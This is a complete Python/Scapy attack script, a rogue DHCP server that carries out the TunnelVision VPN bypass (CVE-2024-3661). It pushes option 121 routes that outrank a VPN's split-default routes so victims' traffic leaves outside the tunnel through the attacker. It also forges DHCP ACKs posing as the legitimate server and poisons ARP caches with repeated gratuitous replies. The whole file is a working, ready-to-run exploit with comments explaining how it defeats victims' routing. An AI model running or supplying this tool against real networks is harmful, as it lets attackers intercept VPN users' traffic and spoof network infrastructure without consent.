#!/usr/bin/env python3
# v1.6
import argparse
import ipaddress
import os
import sys
import threading
import time

from scapy.all import (
    ARP, Ether, IP, UDP, BOOTP, DHCP,
    sniff, sendp, get_if_hwaddr, get_if_addr, get_if_list, conf
)

# ── Globals (populated in main()) ─────────────────────────────────────────────

SERVER_IP   = None
REAL_SERVER = None
SUBNET      = None
NETMASK     = None
GATEWAY     = None
DNS         = None
LEASE_TIME  = None
IFACE       = None
IMPERSONATE = None
OPT121      = None

leases    = {}
allocated = set()
pending   = {}
pool      = []


# ── ARP helpers ───────────────────────────────────────────────────────────────

def send_gratuitous_arp() -> None:
    """Broadcast SERVER_IP → our MAC so the victim's ARP cache is pre-populated."""
    mac = get_if_hwaddr(IFACE)
    pkt = (
        Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
        ARP(op=2, hwsrc=mac, psrc=SERVER_IP,
            hwdst="ff:ff:ff:ff:ff:ff", pdst=SERVER_IP)
    )
    sendp(pkt, iface=IFACE, verbose=False)


def _arp_announce_loop(interval: int) -> None:
    """Daemon: re-broadcast SERVER_IP → our MAC every `interval` seconds."""
    while True:
        send_gratuitous_arp()
        time.sleep(interval)


def handle_arp(pkt) -> None:
    """Reply to WHO-HAS SERVER_IP with our MAC (unicast reply to requester)."""
    if not pkt.haslayer(ARP):
        return
    arp = pkt[ARP]
    if arp.op != 1 or arp.pdst != SERVER_IP:
        return
    mac   = get_if_hwaddr(IFACE)
    reply = (
        Ether(src=mac, dst=arp.hwsrc) /
        ARP(op=2, hwsrc=mac, psrc=SERVER_IP, hwdst=arp.hwsrc, pdst=arp.psrc)
    )
    sendp(reply, iface=IFACE, verbose=False)
    print(f"[ARP ] {arp.psrc} asked for {SERVER_IP} -> replied {mac}")


# ── Route encoding ─────────────────────────────────────────────────────────────

def build_opt121(routes):
    """Encode classless static routes per RFC 3442.

    Each entry: [prefix_len][significant_net_octets][4-byte_gateway]
    A prefix of 0 (default route) contributes 0 network octets.
    When option 121 is present, RFC 3442-compliant clients MUST ignore option 3.
    """
    data = b""
    for net_cidr, gw in routes:
        net    = ipaddress.IPv4Network(net_cidr, strict=False)
        prefix = net.prefixlen
        sig    = (prefix + 7) // 8
        data  += bytes([prefix]) + net.network_address.packed[:sig]
        data  += ipaddress.IPv4Address(gw).packed
    return data


# ── Pool helpers ───────────────────────────────────────────────────────────────

def next_free_ip(mac, hint=None):
    if mac in leases:
        return leases[mac]
    if hint and hint in pool and hint not in allocated:
        return hint
    for ip in pool:
        if ip not in allocated:
            return ip
    return None


# ── DHCP handler ───────────────────────────────────────────────────────────────

def handle_dhcp(pkt):
    if not (pkt.haslayer(DHCP) and pkt.haslayer(BOOTP)):
        return

    dhcp_opts  = {opt[0]: opt[1] for opt in pkt[DHCP].options if isinstance(opt, tuple)}
    msg_type   = dhcp_opts.get("message-type")
    client_mac = pkt[Ether].src

    if msg_type == 1:   # DISCOVER
        hint     = str(dhcp_opts.get("requested_addr") or dhcp_opts.get("requested_IP_address") or "")
        offer_ip = next_free_ip(client_mac, hint or None)
        if not offer_ip:
            print("[!] Pool exhausted")
            return
        pending[client_mac] = offer_ip
        print(f"[DISCOVER] {client_mac} -> offering {offer_ip}")
        send_offer(pkt, client_mac, offer_ip)

    elif msg_type == 3:  # REQUEST
        req_server   = str(dhcp_opts.get("server_id", ""))
        requested_ip = str(
            dhcp_opts.get("requested_addr")
            or dhcp_opts.get("requested_IP_address")
            or pkt[BOOTP].ciaddr
            or ""
        )

        # The client selected another (the real) server. Rather than stay
        # silent, forge an ACK that masquerades as that server so the client
        # accepts the lease it asked for + our option 121. We must echo the
        # exact IP it requested and spoof option 54 to the server it chose.
        if req_server and req_server != SERVER_IP:
            pending.pop(client_mac, None)
            if IMPERSONATE and requested_ip and requested_ip != "0.0.0.0":
                print(f"[REQUEST] {client_mac} -> SPOOFED ACK {requested_ip} (as {req_server})")
                send_ack(pkt, client_mac, requested_ip, server_ip=req_server)
            else:
                print(f"[REQUEST] {client_mac} -> ignored (client chose {req_server})")
            return

        if not requested_ip or requested_ip == "0.0.0.0":
            requested_ip = pending.get(client_mac, "")
        if not requested_ip:
            return

        if requested_ip in pool and (requested_ip not in allocated or leases.get(client_mac) == requested_ip):
            leases[client_mac] = requested_ip
            allocated.add(requested_ip)
            pending.pop(client_mac, None)
            print(f"[REQUEST] {client_mac} -> ACK {requested_ip}")
            send_ack(pkt, client_mac, requested_ip)
        else:
            pending.pop(client_mac, None)
            print(f"[REQUEST] {client_mac} -> NAK (ip {requested_ip} unavailable)")
            send_nak(pkt, client_mac)

    elif msg_type == 7:  # RELEASE
        ip = leases.pop(client_mac, None)
        pending.pop(client_mac, None)
        if ip:
            allocated.discard(ip)
            print(f"[RELEASE] {client_mac} released {ip}")


# ── Packet builders ────────────────────────────────────────────────────────────

def build_base(pkt, client_mac, your_ip, src_ip=None):
    src_ip     = src_ip or SERVER_IP
    server_mac = get_if_hwaddr(IFACE)
    return (
        Ether(src=server_mac, dst="ff:ff:ff:ff:ff:ff") /
        IP(src=src_ip, dst="255.255.255.255") /
        UDP(sport=67, dport=68) /
        BOOTP(
            op=2,
            yiaddr=your_ip,
            siaddr=src_ip,
            chaddr=bytes.fromhex(client_mac.replace(":", "")),
            xid=pkt[BOOTP].xid,
            flags=pkt[BOOTP].flags,
        )
    )


def send_offer(pkt, client_mac, offer_ip):
    reply = build_base(pkt, client_mac, offer_ip) / DHCP(options=[
        ("message-type", "offer"),
        ("server_id",    SERVER_IP),
        ("lease_time",   LEASE_TIME),
        ("subnet_mask",  NETMASK),
        ("name_server",  DNS),
        (121, OPT121),
        "end",
    ])
    sendp(reply, iface=IFACE, verbose=False)


def send_ack(pkt, client_mac, ack_ip, server_ip=None):
    # server_ip defaults to us; when impersonating the real server we spoof
    # both the source IP (build_base) and option 54 to that server's address.
    server_ip = server_ip or SERVER_IP
    reply = build_base(pkt, client_mac, ack_ip, src_ip=server_ip) / DHCP(options=[
        ("message-type", "ack"),
        ("server_id",    server_ip),
        ("lease_time",   LEASE_TIME),
        ("subnet_mask",  NETMASK),
        ("name_server",  DNS),
        (121, OPT121),
        "end",
    ])
    sendp(reply, iface=IFACE, verbose=False)


def send_nak(pkt, _):
    server_mac = get_if_hwaddr(IFACE)
    reply = (
        Ether(src=server_mac, dst="ff:ff:ff:ff:ff:ff") /
        IP(src=SERVER_IP, dst="255.255.255.255") /
        UDP(sport=67, dport=68) /
        BOOTP(op=2, xid=pkt[BOOTP].xid) /
        DHCP(options=[
            ("message-type", "nak"),
            ("server_id",    SERVER_IP),
            "end",
        ])
    )
    sendp(reply, iface=IFACE, verbose=False)


# ── Entry point ────────────────────────────────────────────────────────────────

def main():
    global SERVER_IP, REAL_SERVER, SUBNET, NETMASK, GATEWAY, DNS
    global LEASE_TIME, IFACE, IMPERSONATE, OPT121, pool

    if os.geteuid() != 0:
        sys.exit("[!] Run as root:  sudo python3 121.py ...")

    parser = argparse.ArgumentParser(
        description="Rogue DHCP + option-121 VPN bypass (TunnelVision / CVE-2024-3661)"
    )
    parser.add_argument("-i", "--iface", default=None,
                        help="Interface to listen/send on (default: Scapy auto)")
    parser.add_argument("--list-ifaces", action="store_true",
                        help="Print available interfaces with their IPs and exit")
    parser.add_argument("--server-ip", default=None,
                        help="Our IP on the LAN (default: auto-read from interface)")
    parser.add_argument("--real-server", default="192.168.100.100",
                        help="Legitimate DHCP server IP to impersonate (default: 192.168.100.100)")
    parser.add_argument("--subnet", default="192.168.100.0",
                        help="Network address for the lease pool (default: 192.168.100.0)")
    parser.add_argument("--netmask", default="255.255.255.0",
                        help="Subnet mask to advertise (default: 255.255.255.0)")
    parser.add_argument("--gateway", default=None,
                        help="Gateway to advertise (default: --real-server value)")
    parser.add_argument("--dns", default="8.8.8.8",
                        help="DNS server to advertise (default: 8.8.8.8)")
    parser.add_argument("--pool-start", type=int, default=100,
                        help="Last-octet start of lease pool (default: 100)")
    parser.add_argument("--pool-end", type=int, default=200,
                        help="Last-octet end of lease pool (default: 200)")
    parser.add_argument("--lease-time", type=int, default=3600,
                        help="DHCP lease time in seconds (default: 3600)")
    parser.add_argument("--no-impersonate", action="store_true",
                        help="Disable forging ACKs when the client picks the real server")
    args = parser.parse_args()

    IFACE = args.iface or str(conf.iface)

    if args.list_ifaces:
        print(f"{'Interface':<20} IP")
        print("─" * 36)
        for iface in get_if_list():
            try:
                ip = get_if_addr(iface)
            except Exception:
                ip = "?"
            print(f"  {iface:<18} {ip}")
        return

    # Auto-detect our IP from the chosen interface
    if args.server_ip:
        SERVER_IP = args.server_ip
    else:
        SERVER_IP = get_if_addr(IFACE)
        if not SERVER_IP or SERVER_IP == "0.0.0.0":
            sys.exit(f"[!] Could not detect IP on {IFACE} — use --server-ip <ip>")
        print(f"[*] Auto-detected server IP: {SERVER_IP}  (from {IFACE})")

    REAL_SERVER = args.real_server
    SUBNET      = args.subnet
    NETMASK     = args.netmask
    GATEWAY     = args.gateway or REAL_SERVER
    DNS         = args.dns
    LEASE_TIME  = args.lease_time
    IMPERSONATE = not args.no_impersonate

    pool = [
        str(ip)
        for ip in ipaddress.IPv4Network(f"{SUBNET}/24", strict=False).hosts()
        if args.pool_start <= int(str(ip).split(".")[-1]) <= args.pool_end
    ]

    # Beat the VPN's split-default routes (0.0.0.0/1 + 128.0.0.0/1) via longest-
    # prefix-match: four /2 routes blanket the whole IPv4 space and are MORE
    # specific than the VPN's /1, so the kernel prefers them and traffic exits
    # through SERVER_IP instead of the tunnel. The VPN endpoint's own /32 host
    # route stays most-specific, so the tunnel itself remains up (TunnelVision).
    OPT121 = build_opt121([
        ("0.0.0.0/2",   SERVER_IP),
        ("64.0.0.0/2",  SERVER_IP),
        ("128.0.0.0/2", SERVER_IP),
        ("192.0.0.0/2", SERVER_IP),
    ])

    print(f"[*] DHCP rogue server v1.6  iface={IFACE}  server={SERVER_IP}")
    print(f"[*] Pool: {SUBNET} [{args.pool_start}-{args.pool_end}]  GW: {GATEWAY}  DNS: {DNS}")
    print(f"[*] Impersonation: {'ON (spoofing ' + REAL_SERVER + ')' if IMPERSONATE else 'OFF'}")
    print("[*] Listening for DHCP + ARP...  Ctrl+C to stop\n")

    # Seed victim ARP caches immediately, then keep refreshing every 5 s.
    send_gratuitous_arp()
    threading.Thread(target=_arp_announce_loop, args=(5,), daemon=True).start()

    def _packet_handler(pkt):
        if pkt.haslayer(ARP):
            handle_arp(pkt)
        else:
            handle_dhcp(pkt)

    sniff(
        iface=IFACE,
        filter="(udp and (port 67 or port 68)) or arp",
        prn=_packet_handler,
        store=False,
    )


if __name__ == "__main__":
    main()
